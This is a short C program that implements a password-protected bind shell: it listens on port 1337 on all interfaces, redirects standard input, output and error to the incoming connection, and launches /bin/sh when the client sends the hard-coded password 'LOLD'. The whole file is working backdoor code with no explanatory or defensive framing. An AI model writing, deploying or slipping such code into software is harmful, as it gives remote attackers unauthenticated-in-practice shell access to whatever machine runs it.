#include <unistd.h> 
#include <stdio.h> 
#include <sys/socket.h> 
#include <sys/types.h>
#include <stdlib.h> 
#include <netinet/in.h> 
#include <string.h> 

void main() {
 
  char input[4];
  char pass[] ="LOLD"; 
  int sockfd = socket(2,1,0); //create a new socket 
  
  struct sockaddr_in st;
  st.sin_family = 2;
  st.sin_port = htons(1337);


  inet_aton("0.0.0.0", &st.sin_addr.s_addr); 
  bind(sockfd, ( struct sockaddr *) &st, sizeof(st)); //bind it on port 1337

  listen(sockfd, 0); //start listening 
  int fd = accept(sockfd, NULL, NULL); // and accepting connection 
  
  int i;
  for(i=0; i<=2;i++) {
   dup2(fd, i);  
  }
	read(fd, input, 4);
	if (memcmp(input,pass, 4) == 0) {
		execve("/bin/sh", NULL, NULL);
	}
	else {
			printf( "wrong pass", input); 
			exit(1);
	}




}
